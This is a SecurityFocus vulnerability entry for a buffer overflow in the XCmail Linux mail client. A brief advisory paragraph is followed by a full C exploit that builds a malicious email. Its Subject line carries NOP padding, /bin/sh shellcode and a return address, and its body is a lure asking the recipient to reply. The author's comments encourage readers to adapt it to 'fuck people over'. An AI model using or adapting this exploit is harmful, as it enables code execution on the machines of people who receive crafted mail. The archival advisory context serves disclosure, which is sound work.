source: http://www.securityfocus.com/bid/311/info


XCmail is an X11 mail client for linux.

Arthur <pierric@ADMIN.LINUX.ORG> discovered an exploitable buffer overflow vulnerability in xcmail. The bug appears when replying to a message with a long subject line, and only when autoquote is on. The exploit is trivial, but as the buffer is not very large you have to do very precise return address calculation. It is believed it IS remotely exploitable, but you have to know a lot about the machine you want to gain acces to.

/* 27/02/1999 exploit by XSFX@iname.com.... this bug is not exploitable in any harmful way, at least not easily :)

this only works if target xc-mail has enabled 'Autoquote' (Preferences menu -> Quote -> Autoquote)

Given ESP values are for

>>>> glibc2 0.99.6 dynamically linked official binary <<<<

only when users clicks 'reply' in the message list window, NOT when reading message and clicking 'reply'...

note: find your own adresses if you want to fuck people over, and get an evil shellcode :) and remember, the buffer is very small...

0xbffff140 in Eterm launched from WMaker 0xbfffe9f9 in xterm launched from Eterm... 0xbfffeb10 as root, in xterm, from xinitrc

Greetings: to Jerome_, Dunkahn, lionel doux, niark doux, kevin mitnick l'amis des koalas hergothérapeutes and to my cannabis seeds which are growing on their own while I'm coding :) and to all the Amidoux in the world. Peace :)

note that this exploit is not very usable as-is, cause xc-mail is not suid root... but if you, k1d113, find a way to get a remote xterm :) good luck :) */

#include <stdio.h>

#ifndef ESP #define ESP 0xbffff140 #endif

#ifndef NOP #define NOP 'A' /* this will appear in subject of evil message */ #endif /* so maybe NOP (0x90) is a better choice...

but 'A's are easier to spot when browsing thru memory to find buffer adress :) */

char shellcode[] = "\x89\xe1\x31\xc0\x50\x8d\x5c\x24\xf9\x83" "\xc4\x0c\x50\x53\x89\xca\xb0\x0b\xcd\x80" "/bin/sh";

/* Shellcode from Willy Tarreau (20 bytes) */

/* static inline getesp() { * __asm__(" movl %esp,%eax "); * } */

main(int argc, char **argv) { long unsigned esp; int i,nops=0;

printf("From pop3@192.134.192.112 Wed Dec 2 19:27:57 1998\n"); printf("Date: Wed, 25 Dec 1998 00:00:00 +0000\n"); printf("From: 0z0n3 <friend@localhost>\n");

printf("Subject: ");

for (i=0;i<(204 - strlen(shellcode));i++) { putchar(NOP); nops++; }

printf(shellcode);

/* esp = getesp(); */ esp = ESP;

fprintf(stderr, "sample exploit by XSFX@iname.com\n" "DEBUG: %d NOPs\n" "DEBUG: using %#x (getesp()%+d) as shellcode address\n", nops,esp,esp-getesp());

fwrite(&esp,4,1,stdout); putc('\n',stdout);

printf("Message-Id: <199812021827.TAA23112@003.dyn.ml.org>\n"); printf("To: \"dear user\" <you@domain.com>\n"); printf("\n"); printf("hello ! please reply, i'm not sure my email box is ok :(\n"); printf("\n"); } 